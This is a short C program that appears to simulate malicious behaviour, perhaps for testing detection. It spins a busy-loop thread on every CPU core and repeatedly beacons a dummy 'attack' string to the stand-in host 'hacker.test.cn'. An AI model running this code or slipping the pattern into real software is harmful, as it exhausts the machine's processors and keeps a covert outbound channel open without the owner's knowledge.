#include <arpa/inet.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>
#define SOCKET_FAILURE_RETRY(exp) ({         \
    __typeof__(exp) _rc;                   \
    do {                                   \
        _rc = (exp);                       \
    } while (_rc == -1 && (errno == EINTR || errno == EAGAIN)); \
    _rc; })
static int socket_;
void* thread_func(void* arg) {
    struct timeval _tv;
    while (1) {
        gettimeofday(&_tv, NULL);
        // printf("tv_sec=%ld, tv_usec=%ld\n", _tv.tv_sec, _tv.tv_usec);
        srand(time(NULL));
        int r = rand() % 10001;
        // printf("random=%d\n", r);
    }
    return ((void*)1);
}
uint32_t sender(uint32_t socket_, void* data, uint32_t size) {
    if (socket_ == -1 || size == 0) {
        goto end;
    }
    int err = 0;
    uint32_t left = size;
    //LOGD("will send data %d bytes", size);
    while (left > 0) {
        err = SOCKET_FAILURE_RETRY(send(socket_, data, size, MSG_DONTWAIT | MSG_NOSIGNAL));
        // printf("-> sender err=%d\n", err);
        if (err < 0)
            goto end;
        left -= err;
        data = (void*)((uintptr_t)data + err);
    }
    //LOGD("send data %d bytes done", err);
    return 1;
end:
    printf("failed: %s %d %s\n", __func__, socket_, strerror(errno));
    return 0;
}

int s_connect(struct hostent *h) {
    //socket
    socket_ = socket(PF_INET, SOCK_STREAM, 0);
    if (socket_ < 0) {
        printf("-> failed to open socket !!!");
        return -1;
    }
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(inet_ntoa(*((struct in_addr*)h->h_addr)));
    addr.sin_port = htons(80);
    if (connect(socket_, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        printf("-> failed connect socket errno=%d", errno);
        close(socket_);
        return -1;
    }

    return 0;
}

int main(int argc, char const* argv[]) {
    /* code */
    int err;
    pthread_t thread;
    int i = 0, count = 0;
    char buff[512];
    memset(buff, 0, sizeof(buff));
    FILE* fstream = NULL;
    if (NULL == (fstream = popen("cat /proc/cpuinfo", "r"))) {
        printf("!!! cat /proc/cpuinfo failed !!!\n");
    }
    while (NULL != fgets(buff, sizeof(buff), fstream)) {
        char* tt = strstr(buff, "processor");
        if (tt != NULL) {
            count++;
        }
    }
    pclose(fstream);
    char* host = "hacker.test.cn";
    struct hostent* h;
    h = gethostbyname(host);
    if (h == NULL) {
        printf("!!! gethostbyname failed !!! \n");
        return -1;
    }
    for (i = 0; i < count; i++) {
        err = pthread_create(&thread, NULL, thread_func, NULL);
        if (err != 0) {
            printf("can't create thread !!!");
        }
    }

    char* attack = "hello world ! attack !!!";
    int r = s_connect(h);
    if (r == 0) {
        while (1) {
            uint32_t rep = sender(socket_, attack, strlen(attack) + 1);
            if (rep == 0) {
                close(socket_);
                r = s_connect(h);
                printf("reconnet !!! r=%d\n", r);
            }

            sleep(1);
        }
    }

    return 0;
}
